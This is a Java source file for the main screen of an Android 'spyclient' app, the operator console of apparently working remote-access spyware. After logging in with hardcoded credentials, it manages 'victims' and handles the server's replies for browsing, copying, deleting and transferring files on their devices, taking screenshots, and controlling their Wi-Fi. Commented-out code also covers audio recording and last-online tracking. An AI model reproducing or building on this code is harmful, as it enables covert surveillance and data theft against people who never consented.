package slade.carter.spyclient;

import android.content.Intent;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import org.json.simple.JSONArray;
import org.json.simple.JSONObject;

import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class MainActivity extends AppCompatActivity {
    private static MainActivity _instance;
    private NettyClient nettyClient;
    private EditText _loginET;
    private EditText _passwordET;
    private Button _loginButton;

    //для отслеживания состояния
    private final String ERROR = "error";
    private final String SUCCESS = "success";
    private final String PROCESS = "process";

    private final String FILE_ISNT_DIRECTORY = "fileIsntDirectory";

    private final String WAIT_DOWNLOAD_CONNECTION = "waitDownloadConnection";
    private final String FINISH_RECORD = "finishRecord";

    private String _token;

    public MainActivity() {
        _instance = this;
    }

    public static MainActivity getInstance() {
        return _instance;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login);

        Config.load(getPreferences(MODE_PRIVATE));

        _loginET = (EditText) findViewById(R.id.loginEditText);
        _loginET.setText("vetal");
        _passwordET = (EditText) findViewById(R.id.passwordEditText);
        _passwordET.setText("11211121");
        _loginButton = (Button) findViewById(R.id.loginButton);


        newConnection();
        initListeners();
    }

    private void initListeners() {
        _loginButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                /*if (nettyClient == null || !nettyClient.isConnected()) {
                    showText("Соединение не установлено!");
                    return;
                }*/
                String login = _loginET.getText().toString();
                String password = _passwordET.getText().toString();
                nettyClient.sendAuthUser(login, password);
            }
        });
    }

    private void newConnection() {
        /*_client = new QuerySender();
        _client.execute();*/
        //if (nettyClient != null || nettyClient.isConnected()) return;
        nettyClient = new NettyClient();
        nettyClient.execute();
    }

    public void showText(String message) {
        Toast.makeText(this, message, Toast.LENGTH_SHORT).show();
    }

    private BufferedOutputStream _bufferedOutputStream;

    public void receiveMessage(JSONObject message) {
            if (message.containsKey("errorCode")) {
                String code = (String) message.get("errorCode");
                switch (code) {
                    case Config.INCORRECT_QUERY:
                        showText("Ошибка запроса!");
                        return;
                    case Config.INVALID_AUTH:
                        showText("Ошибка авторизации!");
                        return;
                    case Config.VICTIM_OFFLINE:
                        showText("Жертва оффлайн!");
                        return;
                    case Config.SERVER_ERROR:
                        showText("Внутренняя ошибка сервера!");
                        return;
                    case Config.FILE_IS_DIRECTORY:
                        showText("Это папка!");
                        return;
                    case Config.FILE_ISNT_DIRECTORY:
                        showText("Это не папка!");
                        return;
                }
            }
            String action = (String) message.get("action");
            switch (action) {
                case "auth.user":
                    Config.token = (String) message.get("token");
                    Intent intent = new Intent(this, VictimsActivity.class);
                    startActivity(intent);
                    break;
                case "get.victims":
                    JSONArray victims = (JSONArray) message.get("victims");
                    VictimsActivity.getInstance().initVictimList(victims);
                    break;
                case "get.files":
                    if (message.containsKey("code")) {
                        switch ((String) message.get("code")) {
                            case FILE_ISNT_DIRECTORY:
                                showText("Это не папка!");
                                FileManagerActivity.getInstance().removeLastFile();
                                return;
                            case PROCESS:
                                showText("Получаем файлы...");
                                return;
                            case ERROR:
                                showText("Ошибка получения файлов!");
                                return;
                        }
                    }
                    JSONArray files = (JSONArray) message.get("files");
                    FileManagerActivity.getInstance().initFilesList(files);
                    break;
                case "get.wifi.list":
                    JSONArray wifiList = (JSONArray) message.get("wifiList");
                    WifiManagerActivity.getInstance().initWifiList(wifiList);
                    break;
                case "rename.file":
                    switch ((String) message.get("code")) {
                        case PROCESS:
                            showText("Переименовываем...");
                            return;
                        case SUCCESS:
                            showText("Успешно переименовано!");
                            FileManagerActivity.getInstance().send_getFiles();
                            return;
                        case ERROR:
                            showText("Ошибка переименовки!");
                            return;
                    }
                    break;
                case "copy.file":
                    switch ((String) message.get("code")) {
                        case PROCESS:
                            showText("Копируем...");
                            return;
                        case SUCCESS:
                            showText("Успешно скопировано!");
                            FileManagerActivity.getInstance().send_getFiles();
                            return;
                        case ERROR:
                            showText("Ошибка копирования!");
                            FileManagerActivity.getInstance().clearBuffer();
                            return;
                    }
                    break;
                case "delete.file":
                    switch ((String) message.get("code")) {
                        case PROCESS:
                            showText("Удаляем...");
                            return;
                        case SUCCESS:
                            showText("Успешно удалено!");
                            FileManagerActivity.getInstance().send_getFiles();
                            return;
                        case ERROR:
                            showText("Ошибка удаления!");
                            return;
                    }
                    break;
                case "make.dir":
                    switch ((String) message.get("code")) {
                        /*case PROCESS:
                            showText("Создаем...");
                            return;*/
                        case SUCCESS:
                            showText("Пока создана!");
                            FileManagerActivity.getInstance().send_getFiles();
                            return;
                        case ERROR:
                            showText("Ошибка создания!");
                            return;
                    }
                    break;
                case "get.file.info":
                    String victim = (String) message.get("victim");
                    JSONObject info = (JSONObject) message.get("info");
                    FileManagerActivity.getInstance().initFileInfo(victim, info);
                    break;
                case "get.victim.info":
                    victim = (String) message.get("victim");
                    info = (JSONObject) message.get("info");
                    VictimsActivity.getInstance().initVictimInfo(victim, info);
                    break;
                case "get.last.online":
                    victim = (String) message.get("victim");
                    String lastOnline = (String) message.get("lastOnline");
                    VictimsActivity.getInstance().initVictimLastOnline(victim, lastOnline);
                    break;
                case "start.upload.file":
                    UploadThread upload = new UploadThread((String) message.get("path"), ((Long) message.get("port")).intValue());
                    upload.start();
                    break;
                case "start.download.file":
                    DownloadThread download = new DownloadThread((String) message.get("filename"), ((Long) message.get("port")).intValue(),
                            (String) message.get("downloadPath"));
                    download.start();
                    break;
                case "finish.load.file":
                    switch ((String) message.get("code")) {
                        /*case PROCESS:
                            showText("Создаем...");
                            return;*/
                        case SUCCESS:
                            showText("Загрузка файла завершена!");
                            return;
                        case ERROR:
                            showText("Ошибка загрузки файла!");
                            return;
                    }
                    break;
                case "take.screen":
                    switch ((String) message.get("code")) {
                        case SUCCESS:
                            showText("Скрин экрана сохранен!");
                            FileManagerActivity.getInstance().send_getFiles();
                            return;
                        case ERROR:
                            showText("Не удалось сделать скрин!");
                            return;
                    }
                    break;
                case "wifi.connect":
                    switch ((String) message.get("code")) {
                        case SUCCESS:
                            showText("Подключились к точке Wifi!");
                            return;
                        case ERROR:
                            showText("Не удалось подключиться к точке Wifi!");
                            return;
                    }
                    break;
                case "set.wifi.enabled":
                    boolean wifiState = (Boolean) message.get("wifiState");
                    if (wifiState) showText("Wifi включен!");
                    else showText("Wifi выключен!");
                    break;
                /*case "setName":
                    switch (message.getString("code")) {
                        case PROCESS:
                            showText("Изменяем...");
                            return;
                        case SUCCESS:
                            showText("Имя жертвы изменено!");
                            VictimsActivity.getInstance().send_getVictims();
                            return;
                        case ERROR:
                            showText("Ошибка!");
                            return;
                    }
                    break;
                case "setOwner":
                    switch (message.getString("code")) {
                        case PROCESS:
                            showText("Изменяем...");
                            return;
                        case SUCCESS:
                            showText("Владелец жертвы изменено!");
                            VictimsActivity.getInstance().send_getVictims();
                            return;
                        case ERROR:
                            showText("Ошибка!");
                            return;
                    }
                    break;
                case "setIP":
                    switch (message.getString("code")) {
                        case PROCESS:
                            showText("Изменяем...");
                            return;
                        case SUCCESS:
                            showText("IP для подключения изменен!");
                            VictimsActivity.getInstance().send_getVictims();
                            return;
                        case ERROR:
                            showText("Ошибка!");
                            return;
                    }
                    break;
                case "setServerPort":
                    switch (message.getString("code")) {
                        case PROCESS:
                            showText("Изменяем...");
                            return;
                        case SUCCESS:
                            showText("SERVER_PORT изменен!");
                            VictimsActivity.getInstance().send_getVictims();
                            return;
                        case ERROR:
                            showText("Ошибка!");
                            return;
                    }
                    break;
                case "setDownloadPort":
                    switch (message.getString("code")) {
                        case PROCESS:
                            showText("Изменяем...");
                            return;
                        case SUCCESS:
                            showText("DOWNLOAD_PORT изменен!");
                            VictimsActivity.getInstance().send_getVictims();
                            return;
                        case ERROR:
                            showText("Ошибка!");
                            return;
                    }
                    break;
                case "record":
                    switch (message.getString("code")) {
                        case PROCESS:
                            showText("Начинаем запись...");
                            return;
                        case FINISH_RECORD:
                            showText("Запись завершена!");
                            break;
                        case SUCCESS:
                            showText("Запись начата!");
                            VictimsActivity.getInstance().isClicked = true;
                            return;
                        case ERROR:
                            showText("Ошибка!");
                            VictimsActivity.getInstance().isClicked = true;
                            return;
                    }
                    break;
                case "getLastOnline":
                    if (message.has("code")) {
                        switch (message.getString("code")) {
                            case PROCESS:
                                showText("Получаем последний онлайн...");
                                return;
                        }
                    }

                    String lastOnline = message.getString("lastOnline");
                    VictimsActivity.getInstance().showLastOnline(lastOnline);

                    break;*/
            }
    }
}
